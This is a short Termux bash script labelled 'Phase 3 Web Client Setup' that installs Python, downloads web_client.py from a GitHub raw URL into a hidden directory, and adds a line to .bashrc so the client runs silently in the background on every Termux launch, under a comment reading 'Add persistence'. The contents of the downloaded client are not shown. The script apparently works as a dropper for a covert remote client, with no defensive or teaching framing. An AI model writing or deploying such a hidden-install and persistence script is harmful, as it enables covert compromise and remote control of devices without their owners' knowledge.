#!/data/data/com.termux/files/usr/bin/bash
# Phase 3 Web Client Setup

echo "[*] Updating package lists..."
pkg update -y || { echo "[-] Failed to update."; exit 1; }

echo "[*] Installing Python and dependencies..."
pkg install -y python python-pip || { echo "[-] Failed to install Python."; exit 1; }

echo "[*] Installing required libraries..."
pip install requests || { echo "[-] Failed to install requests."; exit 1; }

REPO_URL="https://github.com/chrv01/c1/raw/main" # UPDATE THIS if your repo is different
CLIENT_SCRIPT="web_client.py"
HIDDEN_DIR="$HOME/.config/.cache"
BASH_RC="$HOME/.bashrc"

mkdir -p "$HIDDEN_DIR"

echo "[*] Downloading web client..."
curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"

chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"

# Add persistence
PERSIST_LINE="pgrep -f \"python.*$CLIENT_SCRIPT\" > /dev/null || (python $HIDDEN_DIR/$CLIENT_SCRIPT >/dev/null 2>&1 &)"
if ! grep -qF "$PERSIST_LINE" "$BASH_RC"; then
    echo "$PERSIST_LINE" >> "$BASH_RC"
fi

echo "[+] Setup complete. Web Client will start on next Termux launch."
